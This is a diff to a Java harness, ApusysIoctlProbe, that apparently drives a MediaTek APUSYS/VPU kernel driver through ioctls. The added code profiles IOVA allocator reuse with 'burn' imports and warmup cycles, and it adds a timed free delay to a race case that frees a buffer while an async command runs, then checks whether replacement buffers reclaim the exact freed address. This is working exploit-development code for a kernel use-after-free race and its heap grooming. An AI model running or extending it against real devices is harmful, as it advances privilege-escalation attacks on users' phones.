@@ -542,6 +542,8 @@ public final class ApusysIoctlProbe {
         boolean apusysIovaGapSourceProfiler = false;
         boolean apusysIovaGapFreeNeighborhoodProfiler = false;
         boolean apusysIovaGapLower2FocusProfiler = false;
+        boolean apusysIovaGapBurnSweepProfiler = false;
+        boolean apusysIovaGapP16R8AbProfiler = false;
         boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlot = false;
         boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlotControl = false;
         boolean runCmdVpuXrpInternalAnnVersionIovaLibvpuDescFlagsMatrix = false;
@@ -797,6 +799,10 @@ public final class ApusysIoctlProbe {
                 apusysIovaGapFreeNeighborhoodProfiler = true;
             } else if ("--apusys-iova-gap-lower2-focus-profiler".equals(arg)) {
                 apusysIovaGapLower2FocusProfiler = true;
+            } else if ("--apusys-iova-gap-burn-sweep-profiler".equals(arg)) {
+                apusysIovaGapBurnSweepProfiler = true;
+            } else if ("--apusys-iova-gap-p16-r8-ab-profiler".equals(arg)) {
+                apusysIovaGapP16R8AbProfiler = true;
             } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-wrapper-data-preload-slot".equals(arg)) {
                 runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlot = true;
             } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-libvpu-desc-send-flags-wrapper-data-preload-slot-control".equals(arg)) {
@@ -950,6 +956,9 @@ public final class ApusysIoctlProbe {
                 || apusysIovaGapPressureProfiler
                 || apusysIovaGapSourceProfiler
                 || apusysIovaGapFreeNeighborhoodProfiler
+                || apusysIovaGapLower2FocusProfiler
+                || apusysIovaGapBurnSweepProfiler
+                || apusysIovaGapP16R8AbProfiler
                 || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescFlagsMatrix
                 || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescFlagsMatrixControl
                 || runCmdVpuXrpInternalAnnVersionIovaLibvpuDescOperandOffsetMatrix
@@ -1593,6 +1602,14 @@ public final class ApusysIoctlProbe {
 
             if (apusysIovaGapLower2FocusProfiler) {
                 runApusysIovaGapLower2FocusProfiler();
+            }
+
+            if (apusysIovaGapBurnSweepProfiler) {
+                runApusysIovaGapBurnSweepProfiler();
+            }
+
+            if (apusysIovaGapP16R8AbProfiler) {
+                runApusysIovaGapP16R8AbProfiler();
             }
 
             if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlot) {
@@ -4722,13 +4739,24 @@ public final class ApusysIoctlProbe {
             + " precreated replacements, and dump exact target-reuse buffers.");
         loadRuntimeLibraries();
 
-        runRunCmdVpuXrpMemFreeRaceCompletedGapReuseCase(0x4000, 16, 16, 30);
-        runRunCmdVpuXrpMemFreeRaceCompletedGapReuseCase(0x4000, 12, 20, 40);
+        XrpSettingsShape output1000 = new XrpSettingsShape(
+            "wrapper_one_data_output1000", 0x1000,
+            XRP_DATA_DESC_SIZE, true);
+
+        runRunCmdVpuXrpMemFreeRaceCompletedGapReuseCase(0x4000, 16, 16, 30,
+            XrpSettingsShape.WRAPPER_ONE_DATA, 0);
+        runRunCmdVpuXrpMemFreeRaceCompletedGapReuseCase(0x4000, 12, 20, 40,
+            XrpSettingsShape.WRAPPER_ONE_DATA, 0);
+        runRunCmdVpuXrpMemFreeRaceCompletedGapReuseCase(0x4000, 16, 16, 30,
+            output1000, 0);
+        runRunCmdVpuXrpMemFreeRaceCompletedGapReuseCase(0x4000, 16, 16, 30,
+            output1000, 250);
     }
 
     private static void runRunCmdVpuXrpMemFreeRaceCompletedGapReuseCase(
             int importSize, int poolCount, int replacementCount,
-            int iterations) throws Exception {
+            int iterations, XrpSettingsShape settingsShape,
+            int freeDelayUs) throws Exception {
         int pairFound = 0;
         int noPair = 0;
         int runOk = 0;
@@ -4753,6 +4781,10 @@ public final class ApusysIoctlProbe {
                     + " size=0x" + Integer.toHexString(importSize)
                     + " pool=" + poolCount
                     + " replacements=" + replacementCount
+                    + " shape=" + settingsShape.label
+                    + " output_size=0x"
+                    + Integer.toHexString(settingsShape.outputSize)
+                    + " free_delay_us=" + freeDelayUs
                     + " free_order=target_then_lower ===");
 
                 pool = createProfilerHardwareBufferPool(poolCount, importSize,
@@ -4791,12 +4823,14 @@ public final class ApusysIoctlProbe {
                 ReplacementImport lower = pool[lowerIndex];
                 int targetIova = target.iovaLow;
                 int lowerIova = lower.iovaLow;
-                fillGapSharedSettings(target, targetIova, importSize);
+                fillGapSharedSettings(target, targetIova, importSize,
+                    settingsShape);
                 dumpGapSharedBuffer("before", target, targetIova);
 
                 long cmdMemDesc = DrmTrigger.sScratchBuf + OFF_MEM_B;
                 cmd = createTwoCommandXrpCommandBuffer(raceFd, 1, cmdMemDesc,
-                    targetIova, importSize, true, "gap_fw_" + iter);
+                    targetIova, importSize, true, settingsShape,
+                    "gap_fw_" + settingsShape.label + "_" + iter);
 
                 long runCmd = DrmTrigger.sScratchBuf + OFF_RUN_CMD;
                 long runRet = submitRunCmdAsync(raceFd, runCmd, cmd.dmaBufFd,
@@ -4804,6 +4838,7 @@ public final class ApusysIoctlProbe {
                 if (runRet >= 0) {
                     runOk++;
                 }
+                parkMicros(freeDelayUs);
 
                 long targetMemDesc = DrmTrigger.sScratchBuf
                     + OFF_MEM_REUSE_BASE
@@ -4858,6 +4893,10 @@ public final class ApusysIoctlProbe {
                     + " lower_idx=" + lowerIndex
                     + " lower=0x" + Integer.toHexString(lowerIova)
                     + " run_async=" + retText(runRet)
+                    + " shape=" + settingsShape.label
+                    + " output_size=0x"
+                    + Integer.toHexString(settingsShape.outputSize)
+                    + " free_delay_us=" + freeDelayUs
                     + " target_free=" + retText(targetFreeRet)
                     + " lower_free=" + retText(lowerFreeRet)
                     + " exact_target=" + exactTargetThis + "/"
@@ -4944,6 +4983,9 @@ public final class ApusysIoctlProbe {
             + " pool=" + poolCount
             + " replacements=" + replacementCount
             + " iterations=" + iterations
+            + " shape=" + settingsShape.label
+            + " output_size=0x" + Integer.toHexString(settingsShape.outputSize)
+            + " free_delay_us=" + freeDelayUs
             + " pair_found=" + pairFound + "/" + iterations
             + " no_pair=" + noPair
             + " run_ok=" + runOk
@@ -5494,6 +5536,185 @@ public final class ApusysIoctlProbe {
             "target_lower_lower2", 100);
     }
 
+    private static void runApusysIovaGapBurnSweepProfiler()
+            throws Exception {
+        System.out.println("\n[*] === APUSYS IOVA gap burn-sweep profiler ===");
+        System.out.println("[*] Mode: allocator-only burn sweep. Fixed"
+            + " constraints: 64K p16/r8, first adjacent target,"
+            + " pre-created replacements, free target then lower. The burn"
+            + " imports are sacrificial imports before recorded replacements.");
+        loadRuntimeLibraries();
+
+        for (int burn = 0; burn <= 7; burn++) {
+            runApusysIovaGapControlProfilerCase(
+                "gap_burn_64k_p16_r8_i120_b" + burn,
+                0x10000, 16, 8, 120, "first", "precreated",
+                "target_lower", 0, burn);
+        }
+    }
+
+    private static void runApusysIovaGapP16R8AbProfiler()
+            throws Exception {
+        System.out.println("\n[*] === APUSYS IOVA gap p16/r8 A/B profiler ===");
+        System.out.println("[*] Mode: allocator-only A/B for the current"
+            + " maximized window. A=no warmup. B=40 cycles of same-size"
+            + " p16/r8 import/free warmup immediately before measurement.");
+        loadRuntimeLibraries();
+
+        for (int rep = 0; rep < 3; rep++) {
+            runApusysIovaGapControlProfilerCase(
+                "gap_ab_A_64k_p16_r8_i120_rep" + rep,
+                0x10000, 16, 8, 120, "first", "precreated",
+                "target_lower", 0, 0);
+        }
+
+        runApusysIovaGapWarmupCycles(
+            "gap_ab_B_warmup_64k_p16_r8_c40", 0x10000, 16, 8, 40);
+
+        for (int rep = 0; rep < 3; rep++) {
+            runApusysIovaGapControlProfilerCase(
+                "gap_ab_B_64k_p16_r8_i120_rep" + rep,
+                0x10000, 16, 8, 120, "first", "precreated",
+                "target_lower", 0, 0);
+        }
+    }
+
+    private static void runApusysIovaGapWarmupCycles(String label,
+                                                     int importSize,
+                                                     int poolCount,
+                                                     int replacementCount,
+                                                     int cycles)
+            throws Exception {
+        if (poolCount < 1 || replacementCount < 1 || cycles < 1) {
+            return;
+        }
+        if (poolCount + replacementCount > MAX_REUSE_PROFILE_IMPORTS) {
+            replacementCount = MAX_REUSE_PROFILE_IMPORTS - poolCount;
+        }
+        if (replacementCount < 1) {
+            return;
+        }
+
+        System.out.println("\n[*] === iova-gap-warmup " + label
+            + " size=0x" + Integer.toHexString(importSize)
+            + " pool=" + poolCount
+            + " replacements=" + replacementCount
+            + " cycles=" + cycles
+            + " ===");
+
+        int apusysFd = -1;
+        int poolImportFailTotal = 0;
+        int replacementImportFailTotal = 0;
+        try {
+            apusysFd = DrmTrigger.openDev(APUSYS_DEV);
+            for (int cycle = 0; cycle < cycles; cycle++) {
+                ReplacementImport[] pool = null;
+                ReplacementImport[] replacements = null;
+                boolean[] poolImported = new boolean[poolCount];
+                boolean[] replacementsImported = new boolean[replacementCount];
+                try {
+                    pool = createProfilerHardwareBufferPool(poolCount,
+                        importSize, label + "_pool_" + cycle);
+                    replacements = createProfilerHardwareBufferPool(
+                        replacementCount, importSize,
+                        label + "_repl_" + cycle);
+
+                    for (int pi = 0; pi < poolCount; pi++) {
+                        long memDesc = DrmTrigger.sScratchBuf
+                            + OFF_MEM_REUSE_BASE
+                            + (pi * OFF_MEM_REUSE_STRIDE);
+                        long ret = importProfilerMem(apusysFd, pool[pi],
+                            memDesc, importSize, "warmup_pool_" + label
+                            + "_" + pi, false);
+                        if (ret >= 0) {
+                            poolImported[pi] = true;
+                        } else {
+                            poolImportFailTotal++;
+                        }
+                    }
+                    for (int pi = 0; pi < poolCount; pi++) {
+                        if (!poolImported[pi]) {
+                            continue;
+                        }
+                        long memDesc = DrmTrigger.sScratchBuf
+                            + OFF_MEM_REUSE_BASE
+                            + (pi * OFF_MEM_REUSE_STRIDE);
+                        freeProfilerMem(apusysFd, pool[pi], memDesc,
+                            "warmup_pool_" + label + "_" + pi, false);
+                        poolImported[pi] = false;
+                    }
+
+                    for (int ri = 0; ri < replacementCount; ri++) {
+                        long memDesc = DrmTrigger.sScratchBuf
+                            + OFF_MEM_REUSE_BASE
+                            + ((poolCount + ri) * OFF_MEM_REUSE_STRIDE);
+                        long ret = importProfilerMem(apusysFd,
+                            replacements[ri], memDesc, importSize,
+                            "warmup_repl_" + label + "_" + ri, false);
+                        if (ret >= 0) {
+                            replacementsImported[ri] = true;
+                        } else {
+                            replacementImportFailTotal++;
+                        }
+                    }
+                    for (int ri = 0; ri < replacementCount; ri++) {
+                        if (!replacementsImported[ri]) {
+                            continue;
+                        }
+                        long memDesc = DrmTrigger.sScratchBuf
+                            + OFF_MEM_REUSE_BASE
+                            + ((poolCount + ri) * OFF_MEM_REUSE_STRIDE);
+                        freeProfilerMem(apusysFd, replacements[ri],
+                            memDesc, "warmup_repl_" + label + "_" + ri,
+                            false);
+                        replacementsImported[ri] = false;
+                    }
+                } finally {
+                    if (replacements != null) {
+                        for (int ri = 0; ri < replacementCount; ri++) {
+                            if (replacementsImported[ri]) {
+                                long memDesc = DrmTrigger.sScratchBuf
+                                    + OFF_MEM_REUSE_BASE
+                                    + ((poolCount + ri)
+                                    * OFF_MEM_REUSE_STRIDE);
+                                freeProfilerMem(apusysFd, replacements[ri],
+                                    memDesc, "warmup_repl_" + label + "_"
+                                    + ri, false);
+                            }
+                        }
+                        closeProfilerBufferPool(replacements);
+                    }
+                    if (pool != null) {
+                        for (int pi = 0; pi < poolCount; pi++) {
+                            if (poolImported[pi]) {
+                                long memDesc = DrmTrigger.sScratchBuf
+                                    + OFF_MEM_REUSE_BASE
+                                    + (pi * OFF_MEM_REUSE_STRIDE);
+                                freeProfilerMem(apusysFd, pool[pi], memDesc,
+                                    "warmup_pool_" + label + "_" + pi,
+                                    false);
+                            }
+                        }
+                        closeProfilerBufferPool(pool);
+                    }
+                }
+            }
+        } finally {
+            if (apusysFd >= 0) {
+                DrmTrigger.closeFd(apusysFd);
+            }
+        }
+
+        System.out.println("[+] iova_gap_warmup_summary " + label
+            + " size=0x" + Integer.toHexString(importSize)
+            + " pool=" + poolCount
+            + " replacements=" + replacementCount
+            + " cycles=" + cycles
+            + " pool_import_fail_total=" + poolImportFailTotal
+            + " replacement_import_fail_total="
+            + replacementImportFailTotal);
+    }
+
     private static void runApusysIovaGapControlProfilerCase(
             String label,
             int importSize,
@@ -5546,14 +5767,35 @@ public final class ApusysIoctlProbe {
             String freeShape,
             int targetAdjacentFound)
             throws Exception {
+        runApusysIovaGapControlProfilerCase(label, importSize, poolCount,
+            replacementCount, iterations, targetMode, replacementSource,
+            freeShape, targetAdjacentFound, 0);
+    }
+
+    private static void runApusysIovaGapControlProfilerCase(
+            String label,
+            int importSize,
+            int poolCount,
+            int replacementCount,
+            int iterations,
+            String targetMode,
+            String replacementSource,
+            String freeShape,
+            int targetAdjacentFound,
+            int burnBeforeRecord)
+            throws Exception {
         if (poolCount < 2 || replacementCount < 1 || iterations < 1) {
             return;
         }
+        if (burnBeforeRecord < 0) {
+            burnBeforeRecord = 0;
+        }
         boolean guardSource = "guard".equals(replacementSource);
         int descriptorSlotsNeeded = poolCount + replacementCount
-            + (guardSource ? 1 : 0);
+            + burnBeforeRecord + (guardSource ? 1 : 0);
         if (descriptorSlotsNeeded > MAX_REUSE_PROFILE_IMPORTS) {
             replacementCount = MAX_REUSE_PROFILE_IMPORTS - poolCount
+                - burnBeforeRecord
                 - (guardSource ? 1 : 0);
         }
         if (replacementCount < 1) {
@@ -5570,6 +5812,7 @@ public final class ApusysIoctlProbe {
             + " replacement_source=" + replacementSource
             + " free_shape=" + freeShape
             + " target_adjacent_found=" + targetAdjacentFound
+            + " burn_before_record=" + burnBeforeRecord
             + " ===");
 
         int apusysFd = -1;
@@ -5580,9 +5823,15 @@ public final class ApusysIoctlProbe {
         int freeShapeUnavailable = 0;
         int exactTargetTotal = 0;
         int exactTargetIterations = 0;
+        int burnExactTargetTotal = 0;
+        int burnExactTargetIterations = 0;
+        int burnLowerHitTotal = 0;
         int lowerHitTotal = 0;
+        int burnImportFailTotal = 0;
         int importFailTotal = 0;
         int poolImportFailTotal = 0;
+        int[] burnExactIndexHistogram = new int[burnBeforeRecord];
+        int[] burnLowerIndexHistogram = new int[burnBeforeRecord];
         int[] exactIndexHistogram = new int[replacementCount];
         int[] firstExactIndexHistogram = new int[replacementCount];
         int[] lowerIndexHistogram = new int[replacementCount];
@@ -5599,14 +5848,21 @@ public final class ApusysIoctlProbe {
                 }
                 iterationsRun = iter + 1;
                 ReplacementImport[] pool = null;
+                ReplacementImport[] burnReplacements = null;
                 ReplacementImport[] replacements = null;
                 ReplacementImport guard = null;
                 boolean guardImported = false;
+                boolean[] burnImported = new boolean[burnBeforeRecord];
                 boolean[] poolImported = new boolean[poolCount];
                 try {
                     pool = createProfilerHardwareBufferPool(poolCount,
                         importSize, label + "_pool_" + iter);
                     if (!"fresh".equals(replacementSource)) {
+                        if (burnBeforeRecord > 0) {
+                            burnReplacements = createProfilerHardwareBufferPool(
+                                burnBeforeRecord, importSize,
+                                label + "_burn_" + iter);
+                        }
                         replacements = createProfilerHardwareBufferPool(
                             replacementCount, importSize,
                             label + "_repl_" + iter);
@@ -5730,6 +5986,11 @@ public final class ApusysIoctlProbe {
                     }
 
                     if ("fresh".equals(replacementSource)) {
+                        if (burnBeforeRecord > 0) {
+                            burnReplacements = createProfilerHardwareBufferPool(
+                                burnBeforeRecord, importSize,
+                                label + "_fresh_burn_" + iter);
+                        }
                         replacements = createProfilerHardwareBufferPool(
                             replacementCount, importSize,
                             label + "_fresh_repl_" + iter);
@@ -5742,7 +6003,8 @@ public final class ApusysIoctlProbe {
                             label + "_guard_" + iter);
                         long guardMemDesc = DrmTrigger.sScratchBuf
                             + OFF_MEM_REUSE_BASE
-                            + ((poolCount + replacementCount)
+                            + ((poolCount + burnBeforeRecord
+                            + replacementCount)
                             * OFF_MEM_REUSE_STRIDE);
                         guardRet = importProfilerMem(apusysFd, guard,
                             guardMemDesc, importSize,
@@ -5750,6 +6012,35 @@ public final class ApusysIoctlProbe {
                         if (guardRet >= 0) {
                             guardImported = true;
                             guardIova = guard.iovaLow;
+                        }
+                    }
+
+                    int burnExactTargetThis = 0;
+                    int burnLowerHitThis = 0;
+                    int burnFailThis = 0;
+                    StringBuilder burnExactIndices = new StringBuilder();
+                    StringBuilder burnLowerIndices = new StringBuilder();
+                    for (int bi = 0; bi < burnBeforeRecord; bi++) {
+                        long memDesc = DrmTrigger.sScratchBuf
+                            + OFF_MEM_REUSE_BASE
+                            + ((poolCount + bi) * OFF_MEM_REUSE_STRIDE);
+                        long ret = importProfilerMem(apusysFd,
+                            burnReplacements[bi], memDesc, importSize,
+                            "gap_ctl_burn_" + label + "_" + bi, false);
+                        if (ret < 0) {
+                            burnFailThis++;
+                            continue;
+                        }
+                        burnImported[bi] = true;
+                        if (burnReplacements[bi].iovaLow == targetIova) {
+                            burnExactTargetThis++;
+                            burnExactIndexHistogram[bi]++;
+                            appendIndex(burnExactIndices, bi);
+                        }
+                        if (burnReplacements[bi].iovaLow == lowerIova) {
+                            burnLowerHitThis++;
+                            burnLowerIndexHistogram[bi]++;
+                            appendIndex(burnLowerIndices, bi);
                         }
                     }
 
@@ -5766,7 +6057,8 @@ public final class ApusysIoctlProbe {
                     for (int ri = 0; ri < replacementCount; ri++) {
                         long memDesc = DrmTrigger.sScratchBuf
                             + OFF_MEM_REUSE_BASE
-                            + ((poolCount + ri) * OFF_MEM_REUSE_STRIDE);
+                            + ((poolCount + burnBeforeRecord + ri)
+                            * OFF_MEM_REUSE_STRIDE);
                         long ret = importProfilerMem(apusysFd,
                             replacements[ri], memDesc, importSize,
                             "gap_ctl_repl_" + label + "_" + ri, false);
@@ -5801,6 +6093,12 @@ public final class ApusysIoctlProbe {
                         }
                     }
 
+                    burnExactTargetTotal += burnExactTargetThis;
+                    burnLowerHitTotal += burnLowerHitThis;
+                    burnImportFailTotal += burnFailThis;
+                    if (burnExactTargetThis > 0) {
+                        burnExactTargetIterations++;
+                    }
                     exactTargetTotal += exactTargetThis;
                     lowerHitTotal += lowerHitThis;
                     importFailTotal += failThis;
@@ -5830,6 +6128,16 @@ public final class ApusysIoctlProbe {
                         + Integer.toHexString(firstReplacementIova)
                         + " guard_ret=" + retText(guardRet)
                         + " guard_iova=0x" + Integer.toHexString(guardIova)
+                        + " burn_before_record=" + burnBeforeRecord
+                        + " burn_exact_target=" + burnExactTargetThis + "/"
+                        + burnBeforeRecord
+                        + " burn_exact_indices="
+                        + indexListText(burnExactIndices)
+                        + " burn_lower_hit=" + burnLowerHitThis + "/"
+                        + burnBeforeRecord
+                        + " burn_lower_indices="
+                        + indexListText(burnLowerIndices)
+                        + " burn_import_fail=" + burnFailThis
                         + " exact_target=" + exactTargetThis + "/"
                         + replacementCount
                         + " exact_indices="
@@ -5848,18 +6156,35 @@ public final class ApusysIoctlProbe {
                         for (int ri = 0; ri < replacementCount; ri++) {
                             long memDesc = DrmTrigger.sScratchBuf
                                 + OFF_MEM_REUSE_BASE
-                                + ((poolCount + ri) * OFF_MEM_REUSE_STRIDE);
+                                + ((poolCount + burnBeforeRecord + ri)
+                                * OFF_MEM_REUSE_STRIDE);
                             freeProfilerMem(apusysFd, replacements[ri],
                                 memDesc, "gap_ctl_repl_" + label + "_" + ri,
                                 false);
                         }
                         closeProfilerBufferPool(replacements);
                     }
+                    if (burnReplacements != null) {
+                        for (int bi = 0; bi < burnBeforeRecord; bi++) {
+                            if (!burnImported[bi]) {
+                                continue;
+                            }
+                            long memDesc = DrmTrigger.sScratchBuf
+                                + OFF_MEM_REUSE_BASE
+                                + ((poolCount + bi)
+                                * OFF_MEM_REUSE_STRIDE);
+                            freeProfilerMem(apusysFd, burnReplacements[bi],
+                                memDesc, "gap_ctl_burn_" + label + "_" + bi,
+                                false);
+                        }
+                        closeProfilerBufferPool(burnReplacements);
+                    }
                     if (guard != null) {
                         if (guardImported) {
                             long guardMemDesc = DrmTrigger.sScratchBuf
                                 + OFF_MEM_REUSE_BASE
-                                + ((poolCount + replacementCount)
+                                + ((poolCount + burnBeforeRecord
+                                + replacementCount)
                                 * OFF_MEM_REUSE_STRIDE);
                             freeProfilerMem(apusysFd, guard, guardMemDesc,
                                 "gap_ctl_guard_" + label, false);
@@ -5883,6 +6208,7 @@ public final class ApusysIoctlProbe {
             }
 
             int totalReplacementImports = adjacentFound * replacementCount;
+            int totalBurnImports = adjacentFound * burnBeforeRecord;
             System.out.println("[+] iova_gap_control_summary " + label
                 + " size=0x" + Integer.toHexString(importSize)
                 + " pool=" + poolCount
@@ -5892,10 +6218,20 @@ public final class ApusysIoctlProbe {
                 + " target_adjacent_found=" + targetAdjacentFound
                 + " target_mode=" + targetMode
                 + " replacement_source=" + replacementSource
+                + " burn_before_record=" + burnBeforeRecord
                 + " adjacent_found=" + adjacentFound + "/" + iterationsRun
                 + " no_adjacent=" + noAdjacent
                 + " no_target_lower=" + noTargetLower
                 + " free_shape_unavailable=" + freeShapeUnavailable
+                + " burn_exact_target_total=" + burnExactTargetTotal + "/"
+                + totalBurnImports
+                + " burn_exact_target_iterations="
+                + burnExactTargetIterations + "/" + adjacentFound
+                + " burn_lower_hit_total=" + burnLowerHitTotal + "/"
+                + totalBurnImports
+                + " burn_import_fail_total=" + burnImportFailTotal
+                + " burn_exact_hist=" + nonZeroHistogram(burnExactIndexHistogram)
+                + " burn_lower_hist=" + nonZeroHistogram(burnLowerIndexHistogram)
                 + " exact_target_total=" + exactTargetTotal + "/"
                 + totalReplacementImports
                 + " exact_target_iterations=" + exactTargetIterations
@@ -6564,6 +6900,18 @@ public final class ApusysIoctlProbe {
             int apusysFd, int index, long memDesc, int sharedIova,
             int sharedSize, boolean completedShape, String label)
             throws Exception {
+        return createTwoCommandXrpCommandBuffer(apusysFd, index, memDesc,
+            sharedIova, sharedSize, completedShape,
+            completedShape ? XrpSettingsShape.WRAPPER_ONE_DATA
+                : XrpSettingsShape.CURRENT,
+            label);
+    }
+
+    private static ReplacementImport createTwoCommandXrpCommandBuffer(
+            int apusysFd, int index, long memDesc, int sharedIova,
+            int sharedSize, boolean completedShape,
+            XrpSettingsShape settingsShape, String label)
+            throws Exception {
         ReplacementImport cmd = new ReplacementImport(index);
         try {
             cmd.reader = createRgbaImageReader(64, 64);
@@ -6576,7 +6924,7 @@ public final class ApusysIoctlProbe {
                     sharedIova, sharedSize, true, XRP_OP_ANN_VERSION, true,
                     VPU_DESC_LIBVPU_SETTINGS5, XRP_CMD_FLAGS_SEND,
                     VPU_DESC_ORDER_CODE_OUTPUT, XRP_SETTINGS_LEN_WRAPPER,
-                    XrpSettingsShape.WRAPPER_ONE_DATA,
+                    settingsShape,
                     VPU_REQUEST_FLAGS_DEFAULT, false, null, null, null,
                     null, null, null, null, null);
             } else {
@@ -6677,6 +7025,15 @@ public final class ApusysIoctlProbe {
                                               int sharedIova,
                                               int sharedSize)
             throws Exception {
+        fillGapSharedSettings(shared, sharedIova, sharedSize,
+            XrpSettingsShape.WRAPPER_ONE_DATA);
+    }
+
+    private static void fillGapSharedSettings(ReplacementImport shared,
+                                              int sharedIova,
+                                              int sharedSize,
+                                              XrpSettingsShape settingsShape)
+            throws Exception {
         if (shared == null || shared.output == null) {
             return;
         }
@@ -6687,7 +7044,15 @@ public final class ApusysIoctlProbe {
         fillXrpSettingsBuffer(planes[0].getBuffer(), sharedIova, sharedSize,
             XRP_OP_ANN_VERSION, XRP_CMD_FLAGS_SEND,
             XRP_OUTPUT_HEADER_FLAG_DEFAULT,
-            XrpSettingsShape.WRAPPER_ONE_DATA, null, null);
+            settingsShape, null, null);
+    }
+
+    private static void parkMicros(int delayUs) {
+        if (delayUs <= 0) {
+            return;
+        }
+        java.util.concurrent.locks.LockSupport.parkNanos(
+            ((long) delayUs) * 1000L);
     }
 
     private static void dumpGapSharedBuffer(String phase,
